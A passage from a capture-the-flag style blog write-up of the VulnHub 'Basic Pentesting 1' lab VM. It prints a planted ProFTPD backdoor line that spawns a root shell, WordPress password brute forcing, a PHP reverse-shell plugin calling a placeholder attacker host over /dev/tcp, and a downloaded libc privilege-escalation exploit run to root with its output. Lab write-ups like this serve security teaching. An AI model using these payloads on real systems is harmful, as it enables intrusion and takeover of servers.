<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> C_HELP	<span class="string">&quot;HELP&quot;</span>		<span class="comment">/* Help */</span></span></span><br></pre></td></tr></table></figure>

<p>Next, we followed <code>core_help</code> function to <code>modules/mod_core.c</code> line 3708.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MODRET <span class="title function_">core_help</span><span class="params">(cmd_rec *cmd)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cmd-&gt;argc == <span class="number">1</span>) &#123;</span><br><span class="line">    pr_help_add_response(cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">char</span> *cp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (cp = cmd-&gt;argv[<span class="number">1</span>]; *cp; cp++)</span><br><span class="line">      *cp = <span class="built_in">toupper</span>(*cp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(cmd-&gt;argv[<span class="number">1</span>], <span class="string">&quot;SITE&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> pr_module_call(&amp;site_module, site_dispatch, cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pr_help_add_response(cmd, cmd-&gt;argv[<span class="number">1</span>]) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> PR_HANDLED(cmd);</span><br><span class="line"></span><br><span class="line">    pr_response_add_err(R_502, _(<span class="string">&quot;Unknown command &#x27;%s&#x27;&quot;</span>), cmd-&gt;argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> PR_ERROR(cmd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> PR_HANDLED(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>core_help</code> function is deal with <code>HELP</code> command. Our <code>HELP</code> command come with argv, it should be continue to <code>pr_help_add_response(cmd, cmd-&gt;argv[1]) == 0</code> at line 3722.</p>
<p>Followed to <code>src/help.c</code> at line 80.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pr_help_add_response</span><span class="params">(cmd_rec *cmd, <span class="type">const</span> <span class="type">char</span> *target)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (help_list) &#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">help_rec</span> *<span class="title">helps</span> =</span> help_list-&gt;elts;</span><br><span class="line">    <span class="type">char</span> *outa[<span class="number">8</span>], *outstr;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">9</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">    <span class="type">int</span> col = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!target) &#123;</span><br><span class="line">      pr_response_add(R_214,</span><br><span class="line">        _(<span class="string">&quot;The following commands are recognized (* =&gt;&#x27;s unimplemented):&quot;</span>));</span><br><span class="line"></span><br><span class="line">      <span class="built_in">memset</span>(outa, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(outa));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; help_list-&gt;nelts; i++) &#123;</span><br><span class="line">        outstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (helps[i].impl)</span><br><span class="line">          outa[col++] = (<span class="type">char</span> *) helps[i].cmd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          outa[col++] = pstrcat(cmd-&gt;tmp_pool, helps[i].cmd, <span class="string">&quot;*&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 8 rows */</span></span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span> ||</span><br><span class="line">            helps[i+<span class="number">1</span>].cmd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">          <span class="keyword">register</span> <span class="type">unsigned</span> <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (outa[j]) &#123;</span><br><span class="line">              <span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;%-8s&quot;</span>, outa[j]);</span><br><span class="line">              buf[<span class="keyword">sizeof</span>(buf)<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">              outstr = pstrcat(cmd-&gt;tmp_pool, outstr, buf, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (*outstr)</span><br><span class="line">            pr_response_add(R_DUP, <span class="string">&quot;%s&quot;</span>, outstr);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">memset</span>(outa, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(outa));</span><br><span class="line">          col = <span class="number">0</span>;</span><br><span class="line">          outstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      pr_response_add(R_DUP, _(<span class="string">&quot;Direct comments to %s&quot;</span>),</span><br><span class="line">        cmd-&gt;server-&gt;ServerAdmin ? cmd-&gt;server-&gt;ServerAdmin : <span class="string">&quot;ftp-admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(target, <span class="string">&quot;ACIDBITCHEZ&quot;</span>) == <span class="number">0</span>) &#123; setuid(<span class="number">0</span>); setgid(<span class="number">0</span>); system(<span class="string">&quot;/bin/sh;/sbin/sh&quot;</span>); &#125;</span><br><span class="line">      <span class="comment">/* List the syntax for the given target command. */</span></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; help_list-&gt;nelts; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strcasecmp(helps[i].cmd, target) == <span class="number">0</span>) &#123;</span><br><span class="line">          pr_response_add(R_214, <span class="string">&quot;Syntax: %s %s&quot;</span>, helps[i].cmd,</span><br><span class="line">            helps[i].syntax);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    errno = ENOENT;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  errno = ENOENT;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now we finally find the backdoor! Since we called <code>pr_help_add_response</code> function with <code>char *target</code>, it will pass <code>if</code> condiction and go to <code>else</code> part. That’s it. There is a very strange line of code at line 131.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(target, <span class="string">&quot;ACIDBITCHEZ&quot;</span>) == <span class="number">0</span>) &#123; setuid(<span class="number">0</span>); setgid(<span class="number">0</span>); system(<span class="string">&quot;/bin/sh;/sbin/sh&quot;</span>); &#125;</span><br></pre></td></tr></table></figure>
<p>If the target is <code>ACIDBITCHEZ</code>, it will execute a root shell!</p>
<h3 id="Similar-vulnerability"><a href="#Similar-vulnerability" class="headerlink" title="Similar vulnerability"></a>Similar vulnerability</h3><p>This reminds me of another, very similar vulnerability: <a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor">vsfptd v2.3.4 Backdoor Command Execution</a>.<br>It’s also an open source FTP server containing backdoor at v2.3.4. When any FTP username end with <code>:)</code>, vsftpd will start a shell and listen to port 6200 no matter the password is correct or not.</p>
<h2 id="Method-02-Web-Server"><a href="#Method-02-Web-Server" class="headerlink" title="Method 02: Web Server"></a>Method 02: Web Server</h2><p>The VM also open port 80 with Apache httpd service, but the index is just the default page so I start my routine work to pentest this website.</p>
<p>First, I use <code>dirb</code> to scan the URL and found the <code>secret</code> folder. It’s actually a WordPress page but its static files seems not correctly loaded.</p>
<p><img src="/host.png" alt="host"></p>
<p>It’s easy to solve this problem. Just modify your host computer’s <code>/etc/hosts</code> file and add your VM’s ip in the file. For example, my VM’s ip is <code>192.168.56.102</code>, add <code>192.168.56.102 vtcsec</code> to the file and save it. Force reload the web page and you should see the full page completely.</p>
<h3 id="Get-admin"><a href="#Get-admin" class="headerlink" title="Get admin"></a>Get admin</h3><p>Back to our challenge, now we know that this is a default WordPress site. Maybe we can try brute force attack to crack the admin’s password. Using <code>wpscan</code> we can easily scan WordPress site and brute force attack to enumerate password. You can find some wordlists from <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">SecLists</a>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wpscan --url http://192.168.56.102/secret --username admin --wordlist 10-million-password-list-top-10000.txt</span><br></pre></td></tr></table></figure>

<p>The result admin’s password is <code>admin</code> orz…<br>Never mind, now we can access the admin control panel.</p>
<h3 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h3><p>Since we have the admin privilege, we can control this WordPress site including upload custom plugin.</p>
<p>WordPress allow user to install plugin from <a target="_blank" rel="noopener" href="https://wordpress.org/plugins/">WordPress Plugin Directory</a> or upload custom plugin in <code>.zip</code> format. We can build our own plugin and install it to get the web shell.</p>
<p>Here is a simple PHP reverse shell in WordPress Plugin format:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Plugin Name: MyWebshell</span></span><br><span class="line"><span class="comment"> * Description: A simple webshell.</span></span><br><span class="line"><span class="comment"> * Version: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/[REVERSE_HOST_IP]/[LISTENED_PORT] 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Compress this PHP file to a <code>zip</code> file. You can now upload and install this “reverse shell” plugin. All WordPress plugin can be access at <code>/wp-contents/plugins/[PLUGIN_NAME]/[FILE_NAME]</code>.</p>
<p>Just start a listening port, you can browse the plugin file you uploaded before and wait for reverse shell coming.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.56.104] from (UNKNOWN) [192.168.56.102] 35928</span><br><span class="line">bash: cannot set terminal process group (1223): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@vtcsec:/var/www/html/secret/wp-admin$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@vtcsec:/var/www/html/secret/wp-admin$</span><br></pre></td></tr></table></figure>

<h3 id="Get-root"><a href="#Get-root" class="headerlink" title="Get root"></a>Get root</h3><p>Now we have a reverse shell, but the user is <code>www-data</code>, we want <code>root</code>! Let’s try local privilege escalation attack.</p>
<p>First, I used this script <a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">GitHub - mzet-&#x2F;linux-exploit-suggester: Linux privilege escalation auditing tool</a> to search if there is any useful local privilege escalatiopn exploit exist or not.</p>
<p>The result give me a list of some possible exploits, I choose a latest one: <a target="_blank" rel="noopener" href="https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/">Libc Realpath Buffer Underflow</a>.<br>My victim VM and attack VM (Kali Linux) are both in the same Host Only Network. I start a simple python HTTP server on Kali so I can use <code>wget</code> to download exploit code from victim VM and compile it:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(Kali) $ python -m SimpleHTTPServer 80</span><br><span class="line"></span><br><span class="line">(Victim) $ cd /tmp &amp;&amp; wget http://[KALI_IP]/exploit.c</span><br><span class="line">(Victim) $ gcc exploit.c -o exploit</span><br><span class="line">(Victim) $ chmod +x exploit &amp;&amp; ./exploit</span><br><span class="line">./exploit</span><br><span class="line">./exploit: setting up environment ...</span><br><span class="line">Detected OS version: &quot;16.04.3 LTS (Xenial Xerus)&quot;</span><br><span class="line">./exploit: using umount at &quot;/bin/umount&quot;.</span><br><span class="line">No pid supplied via command line, trying to create a namespace</span><br><span class="line">CAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.</span><br><span class="line">Namespaced filesystem created with pid 2874</span><br><span class="line">Attempting to gain root, try 1 of 10 ...</span><br><span class="line">Starting subprocess</span><br><span class="line">Stack content received, calculating next phase</span><br><span class="line">Found source address location 0x7ffe47de78e8 pointing to target address 0x7ffe47de79b8 with value 0x7ffe47de9221, libc offset is 0x7ffe47de78d8</span><br><span class="line">Changing return address from 0x7f4b1c234830 to 0x7f4b1c2d3e00, 0x7f4b1c2e0a20</span><br><span class="line">Using escalation string %69$hn%73$hn%1$2592.2592s%70$hn%1$4621.4621s%67$hn%1$1.1s%71$hn%1$8658.8658s%66$hn%1$16715.16715s%68$hn%72$hn%1$32949.32949s%1$30918.30918s%1$s%1$s%65$hn%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%39$hn-%35$lx-%39$lx-%64$lx-%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%70$lx-%71$lx-%78$s</span><br><span class="line">Executable now root-owned</span><br><span class="line">Cleanup completed, re-invoking binary</span><br><span class="line">/proc/self/exe: invoked as SUID, invoking shell ...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>

<p>That is! Now you can do whatever you want for example change <code>root</code> password, create a new user or something else.</p>

            


        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">TAGGED IN</span><br/>
                
    <a class="tag tag--primary tag--small t-none-link" href="/tags/Writeups/" rel="tag">Writeups</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/Research/PHP-The-issue-between-parse-url-and-real-path/"
                    data-tooltip="PHP: The issue between parse_url and real file path"
                    aria-label="PREVIOUS: PHP: The issue between parse_url and real file path"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/Writeups/VulnHub/VulnHub-Node-1/"
                    data-tooltip="VulnHub #Node:1"
                    aria-label="NEXT: VulnHub #Node:1"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"
                    title="Share on Facebook"
                    aria-label="Share on Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"
                    title="Share on Twitter"
                    aria-label="Share on Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
                <li class="post-action">
                    <a
                        class="post-action-btn btn btn--default"
                        href="#disqus_thread"
                        aria-label="Leave a comment"
                    >
                        <i class="fa fa-comment"></i>
                    </a>
                </li>
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
                <div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2025 Theo Chen. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/Research/PHP-The-issue-between-parse-url-and-real-path/"
                    data-tooltip="PHP: The issue between parse_url and real file path"
                    aria-label="PREVIOUS: PHP: The issue between parse_url and real file path"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/Writeups/VulnHub/VulnHub-Node-1/"
                    data-tooltip="VulnHub #Node:1"
                    aria-label="NEXT: VulnHub #Node:1"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"
                    title="Share on Facebook"
                    aria-label="Share on Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"
                    title="Share on Twitter"
                    aria-label="Share on Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
                <li class="post-action">
                    <a
                        class="post-action-btn btn btn--default"
                        href="#disqus_thread"
                        aria-label="Leave a comment"
                    >
                        <i class="fa fa-comment"></i>
                    </a>
                </li>
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                
    <div id="share-options-bar" class="share-options-bar" data-behavior="2">
        <i id="btn-close-shareoptions" class="fa fa-times"></i>
        <ul class="share-options">
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"
                        aria-label="Share on Facebook"
                    >
                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"
                        aria-label="Share on Twitter"
                    >
                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
                    </a>
                </li>
            
        </ul>
    </div>


            
        </div>
        


    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <img id="about-card-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
        
            <h4 id="about-card-name">Theo Chen</h4>
        
            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>Threat Researcher</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker-alt"></i>
                <br/>
                Taipei, Taiwan
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->

<script src="/assets/js/script-ntjm1xxqdwr7uhkrlwal4hkgsjrprt8jr4d5cauo3fpjpjoa3nude4bnfikw.min.js"></script>

<!--SCRIPTS END-->


    
        <script>
          var disqus_config = function() {
            this.page.url = 'https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/';
              
            this.page.identifier = 'Writeups/VulnHub/VulnHub-Basic-Pentesting-1/';
              
          };
          (function() {
            var d = document, s = d.createElement('script');
            var disqus_shortname = 'theo-5';
            s.src = '//' + disqus_shortname + '.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
          })();
        </script>
    




    </body>
</html>
